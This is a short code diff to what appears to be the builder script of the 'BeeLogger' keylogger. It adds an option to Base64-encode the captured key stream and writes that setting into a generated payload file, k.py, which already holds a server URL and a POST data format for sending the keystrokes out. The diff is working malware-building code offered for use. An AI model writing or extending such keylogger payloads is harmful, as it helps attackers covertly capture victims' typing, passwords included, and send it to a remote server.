@@ -17,10 +17,13 @@ def begin_http():
 # TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
     serverURL = raw_input('Type the server URL to post data to: ')
     postData = raw_input('Type the POST data format ($KeyStream$=the keys stream, $Date$-date): ')
+    base64encode = raw_input('Do you want to encode the keys in Base64 (y/n): ');
+    
     print '\n'
     print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n   serverURL: ' + serverURL
     print '   postData: ' + postData 
+    print '   Encode the keys stream in Base64: ' + str(base64encode == 'y')
     print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n'    
     ask = raw_input('These info above are correct? (y/n) :')
@@ -34,6 +37,7 @@ def begin_http():
     payload += '# -*- coding: utf-8 -*-\n'
     payload += 'SERVER_URL = ' + "'" + serverURL + "'" + '\n'
     payload += 'POST_DATA = ' + "'" + postData + "'" + '\n'
+    payload += 'BASE64_ENC = ' + "'" + base64encode + "'" + '\n'
     payload += str(o)
     with open('k.py', 'w') as f:
         f.write(payload)
